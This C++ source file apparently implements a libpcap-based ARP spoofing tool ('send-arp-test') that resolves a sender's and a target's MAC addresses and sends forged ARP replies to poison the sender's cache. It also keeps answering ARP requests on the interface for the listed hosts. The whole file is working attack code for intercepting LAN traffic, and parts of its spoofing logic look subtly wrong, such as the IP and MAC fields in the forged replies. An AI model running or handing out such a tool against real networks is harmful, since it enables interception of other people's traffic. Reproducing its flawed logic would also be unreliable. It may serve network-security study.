#include <vector>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <ifaddrs.h>
#include <cstdio>
#include <pcap.h>
#include <string>
#include "ethhdr.h"
#include "iphdr.h"
#include "arphdr.h"
#include <map>
using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void printUsage() {
    printf("syntax: send-arp-test <interface> <sender_ip1> <target_ip1> [<sender_ip2> <target_ip2> ...]\n");
    printf("sample: send-arp-test wlan0 192.168.0.1 192.168.0.254\n");
}

void sendArpPacket(pcap_t* pcapHandle, Mac destMac, Mac srcMac, Mac arpSenderMac, Ip arpSenderIp, Mac arpTargetMac, Ip arpTargetIp, uint16_t operation) {
    EthArpPacket packet;
    packet.eth_.dmac_ = destMac;
    packet.eth_.smac_ = srcMac;
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(operation);
    packet.arp_.smac_ = arpSenderMac;
    packet.arp_.sip_ = htonl(arpSenderIp);
    packet.arp_.tmac_ = arpTargetMac;
    packet.arp_.tip_ = htonl(arpTargetIp);

    int result = pcap_sendpacket(pcapHandle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (result != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", result, pcap_geterr(pcapHandle));
    }
}

bool waitForArpReply(pcap_t* pcapHandle, Ip expectedIp, Mac& receivedMac) {
    struct pcap_pkthdr* header;
    const u_char* packet;
    int result;

    while ((result = pcap_next_ex(pcapHandle, &header, &packet)) == 1) {
        EthHdr* ethernetHeader = (EthHdr*)packet;
        if (ethernetHeader->type_ == htons(EthHdr::Arp)) {
            ArpHdr* arpHeader = (ArpHdr*)(packet + sizeof(EthHdr));
            if (arpHeader->op_ == htons(ArpHdr::Reply) && ntohl(arpHeader->sip_) == expectedIp) {
                receivedMac = arpHeader->smac_;
                return true;
            }
        }
    }
    if (result < 0) printf("pcap_next_ex return %d(%s)\n", result, pcap_geterr(pcapHandle));
    return false;
}

void processArpPacket(pcap_t* pcapHandle, const u_char* packetData, const pcap_pkthdr* packetHeader, map<Ip, Mac>& ipToMacMap) {
    EthHdr* ethernetHeader = (EthHdr*)packetData;
    if (ethernetHeader->type_ == htons(EthHdr::Arp)) {
        ArpHdr* arpHeader = (ArpHdr*)(packetData + sizeof(EthHdr));
        if (arpHeader->op_ == htons(ArpHdr::Request)) {
            Ip targetIp = Ip(ntohl(arpHeader->tip_));
            if (ipToMacMap.count(targetIp)) {
                sendArpPacket(pcapHandle, arpHeader->smac_, ipToMacMap[targetIp], ipToMacMap[targetIp], targetIp, arpHeader->smac_, ntohl(arpHeader->sip_), ArpHdr::Reply);
            }
        }
    }
}

void getDeviceMacAddress(char* macBuffer, const char* device) {
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	struct ifreq ifr;
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, device, IFNAMSIZ - 1);
	ioctl(fd, SIOCGIFHWADDR, &ifr);
	close(fd);
	unsigned char* mac = (unsigned char*)ifr.ifr_hwaddr.sa_data;
	snprintf(macBuffer, 18, "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

void getDeviceIpAddress(char* ipBuffer, size_t bufferSize, const char* device) {
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	struct ifreq ifr;
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, device, IFNAMSIZ - 1);
	ioctl(fd, SIOCGIFADDR, &ifr);
	close(fd);
	strncpy(ipBuffer, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr), bufferSize);
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc % 2) != 0) {
        printUsage();
        return -1;
    }

    char* device = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcapHandle = pcap_open_live(device, BUFSIZ, 1, 1000, errbuf);
    if (pcapHandle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", device, errbuf);
        return -1;
    }

    char macAddressBuffer[18];
    char ipAddressBuffer[16];

    getDeviceMacAddress(macAddressBuffer, device);
    getDeviceIpAddress(ipAddressBuffer, sizeof(ipAddressBuffer), device);

    Mac myMac = Mac(macAddressBuffer);
    Ip myIp = Ip(ipAddressBuffer);

    map<Ip, Mac> ipToMacMap;
    for (int i = 2; i < argc; i += 2) {
        Ip senderIp = Ip(argv[i]);
        Ip targetIp = Ip(argv[i + 1]);

        sendArpPacket(pcapHandle, Mac("ff:ff:ff:ff:ff:ff"), myMac, myMac, myIp, Mac("00:00:00:00:00:00"), senderIp, ArpHdr::Request);
        if (waitForArpReply(pcapHandle, senderIp, ipToMacMap[senderIp])) {
            sendArpPacket(pcapHandle, Mac("ff:ff:ff:ff:ff:ff"), myMac, myMac, myIp, Mac("00:00:00:00:00:00"), targetIp, ArpHdr::Request);
            if (waitForArpReply(pcapHandle, targetIp, ipToMacMap[targetIp])) {
                sendArpPacket(pcapHandle, ipToMacMap[senderIp], myMac, myMac, myIp, ipToMacMap[targetIp], senderIp, ArpHdr::Reply);
            }
        }
    }

    while (true) {
        struct pcap_pkthdr* packetHeader;
        const u_char* packetData;
        int result = pcap_next_ex(pcapHandle, &packetHeader, &packetData);
        if (result == PCAP_ERROR || result == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", result, pcap_geterr(pcapHandle));
            break;
        }
        processArpPacket(pcapHandle, packetData, packetHeader, ipToMacMap);
    }
    pcap_close(pcapHandle);
    return 0;
}
